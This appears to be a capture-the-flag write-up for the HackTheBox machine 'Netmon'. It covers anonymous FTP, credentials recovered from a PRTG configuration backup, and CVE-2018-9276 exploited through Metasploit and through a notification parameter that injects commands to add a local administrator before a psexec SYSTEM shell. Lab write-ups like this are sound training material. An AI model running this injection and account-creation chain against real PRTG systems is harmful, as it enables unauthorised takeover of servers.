---
layout: post
title: "HTB - Netmon"
date: 2026-11-19
categories: [HackTheBox, Windows]
tags: [htb, writeup, windows, ftp, prtg, cve-2018-9276, rce, default-credentials]
---

# Enumeration

```bash
sudo nmap -p 21,80,135,139,445,5985,47001,49664-49669 -sVC 10.129.230.176 --min-rate 1000
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-title: Welcome | PRTG Network Monitor (NETMON)
|_http-server-header: PRTG/18.1.37.13946
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Key findings: anonymous FTP access to the system root, and **PRTG Network Monitor 18.1.37** on port 80.

## FTP — Anonymous Access

FTP exposes the full Windows filesystem root. User flag is immediately accessible:

```
ftp> cd Users\Public\Desktop
ftp> get user.txt
```

## FTP — PRTG Configuration Backup

PRTG stores its configuration files under `ProgramData\Paessler\PRTG Network Monitor`. Three configuration files are present — the oldest backup is the most valuable:

```
ftp> cd ProgramData\Paessler\PRTG Network Monitor
ftp> get "PRTG Configuration.old.bak"
```

Searching the backup for credentials:

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

The machine was released in 2019, and PRTG enforces periodic password rotation. The backup is from 2018 — trying the year-incremented variant `PrTg@dmin2019` authenticates successfully against the web interface.

---

# Exploitation

## CVE-2018-9276 — PRTG Authenticated RCE via Notification Injection

PRTG versions prior to 18.2.39 allow authenticated users to create notifications that execute scripts. The `Parameter` field passed to the script handler is not sanitized, enabling OS command injection by appending a semicolon followed by arbitrary commands.

### With Metasploit

```bash
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS 10.129.230.176
set ADMIN_PASSWORD PrTg@dmin2019
set LHOST 10.10.15.140
run
```

```
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2019)
[+] Triggered malicious notification
[*] Meterpreter session 1 opened

meterpreter > shell
whoami
nt authority\system
```

### Without Metasploit

Navigate to **Setup > Account Settings > Notifications > Add new notification**, scroll to **Execute Program**, and set:

```
Program File:  Demo exe notification - outfile.ps1
Parameter:     test.txt;net user zprytka Pass123 /add;net localgroup administrators zprytka /add
```

Save and trigger the notification. This creates a local administrator. Verify access and obtain a SYSTEM shell via psexec:

```bash
smbmap -H 10.129.230.176 -u zprytka -p "Pass123"
[+] IP: 10.129.230.176:445   Status: ADMIN!!!
        ADMIN$   READ, WRITE
        C$       READ, WRITE
```

```bash
impacket-psexec zprytka:'Pass123'@10.129.230.176
C:\Windows\system32> whoami
nt authority\system
```
